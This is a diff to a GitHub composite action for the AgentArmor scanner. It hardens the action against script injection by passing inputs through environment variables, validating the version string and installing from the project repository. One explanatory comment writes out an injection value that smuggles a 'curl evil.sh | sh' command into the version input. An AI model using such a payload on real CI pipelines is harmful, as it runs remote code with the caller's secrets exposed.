@@ -28,39 +28,65 @@ inputs:
 runs:
   using: composite
   steps:
+    # Every input reaches the shell through env, never through an expression inside
+    # a run: script. GitHub substitutes expressions into the script text before bash
+    # sees it, so an input such as  1.0.0"; curl evil.sh | sh; echo "  becomes shell
+    # code. A composite action runs in the caller's runner with the caller's secrets
+    # in the environment, which makes that a supply-chain problem for every
+    # repository using it rather than a local bug.
+    - name: Validate the requested version
+      shell: bash
+      env:
+        VERSION: ${{ inputs.version }}
+      run: |
+        # Also constrains the git ref below: unvalidated, this input could name any
+        # ref in the repository instead of a release tag.
+        if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+          echo "::error::version must look like 1.5.0 (got: $VERSION)"
+          exit 1
+        fi
     - name: Install AgentArmor
       shell: bash
-        # Installed from the repository, not PyPI: the agentarmor name there belongs
-        # to an unrelated project, so `pip install agentarmor==<v>` fetched someone
-        # else's package and `agentarmor scan` was then not on PATH. This action has
-        # never worked for that reason.
-      run: pip install "agentarmor @ git+https://github.com/YashvantHange/AgentArmor.git@v${{ inputs.version }}"
+      env:
+        VERSION: ${{ inputs.version }}
+        REPO_URL: https://github.com/YashvantHange/AgentArmor.git
+      # Installed from the repository, not PyPI: the agentarmor name there belongs to
+      # an unrelated project, so installing it fetched someone else's package and the
+      # agentarmor command was then not on PATH. This action never worked.
+      run: pip install "agentarmor @ git+${REPO_URL}@v${VERSION}"
     - name: Run security scan
       shell: bash
+      env:
+        SUITE: ${{ inputs.suite }}
+        PROVIDER: ${{ inputs.provider }}
+        URL: ${{ inputs.url }}
+        CONFIG: ${{ inputs.config }}
       run: |
-        if [ -n "${{ inputs.suite }}" ]; then
-          agentarmor benchmark --provider "${{ inputs.provider || 'openai' }}" \
-            --suite "${{ inputs.suite }}" -o benchmark.json --format json
+        if [ -n "$SUITE" ]; then
+          agentarmor benchmark --provider "${PROVIDER:-openai}"             --suite "$SUITE" -o benchmark.json --format json
           echo "Benchmark complete"
           exit 0
         fi
-        ARGS="--format sarif -o findings.sarif"
-        if [ -n "${{ inputs.url }}" ]; then
-          agentarmor scan --url "${{ inputs.url }}" $ARGS
-        elif [ -n "${{ inputs.provider }}" ]; then
-          agentarmor scan --provider "${{ inputs.provider }}" $ARGS
+        if [ -n "$URL" ]; then
+          agentarmor scan --url "$URL" --format sarif -o findings.sarif
+        elif [ -n "$PROVIDER" ]; then
+          agentarmor scan --provider "$PROVIDER" --format sarif -o findings.sarif
         else
-          agentarmor scan --config "${{ inputs.config }}" $ARGS
+          agentarmor scan --config "$CONFIG" --format sarif -o findings.sarif
         fi
     - name: Upload SARIF
-      if: inputs.suite == ''
+      # Only when the scan produced one. An unconditional upload turns a failed scan
+      # into a second, more confusing failure pointing at the upload step.
+      if: inputs.suite == '' && hashFiles('findings.sarif') != ''
       uses: github/codeql-action/upload-sarif@v3
       with:
         sarif_file: findings.sarif
     - name: Gate on severity
       if: inputs.suite == ''
       shell: bash
-      run: agentarmor gate --sarif findings.sarif --fail-on "${{ inputs.fail-on }}"
+      env:
+        FAIL_ON: ${{ inputs.fail-on }}
+      run: agentarmor gate --sarif findings.sarif --fail-on "$FAIL_ON"
     - name: Upload benchmark artifact
       if: inputs.suite != ''
       uses: actions/upload-artifact@v4
